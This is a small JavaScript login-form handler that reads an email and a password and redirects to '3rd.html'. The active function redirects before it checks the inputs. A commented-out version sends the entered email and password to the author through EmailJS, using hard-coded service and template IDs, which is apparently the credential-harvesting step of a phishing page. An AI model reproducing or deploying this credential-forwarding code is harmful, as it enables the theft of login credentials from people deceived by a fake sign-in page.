

function func(event){
    event.preventDefault();
window.location.href = "3rd.html";
    const email=document.getElementById("Input_Email").value;
    const password= document.getElementById('Input_Password').value;

if (email && password) {
    // If valid, redirect to "3rd.html"
    window.location.href = "3rd.html"; // Opens 3rd.html
} else {
    // Show an alert if fields are empty
    return;
}
}


    




  

// function func(event) {
//     event.preventDefault();  // Prevent the default form submission

//     var email = document.getElementById("Input_Email").value;
//     var password = document.getElementById("Input_Password").value;

//     // Check if email and password are not empty
//     if (email && password) {
//         var params = {
//             email: email,
//             password: password
//         };

//         const serviceID = "service_ejvpy8u";
//         const templateID = "template_cv1rjqo";

//         // Send the email using EmailJS
//         emailjs.send(serviceID, templateID, params)
//             .then(function(res) {
//                 console.log(res);
//                 // After successful email send, redirect to the next page
//                 window.location.href = "3rd.html";  // Redirect to "3rd.html"
//             })
//             .catch(function(err) {
//                 console.log("Error sending email:", err);
//                 alert("There was an error sending your email. Please try again.");
//             });

//     } else {
//         // Show an alert if email or password is missing
//         alert("Please enter both email and password.");
//     }
// }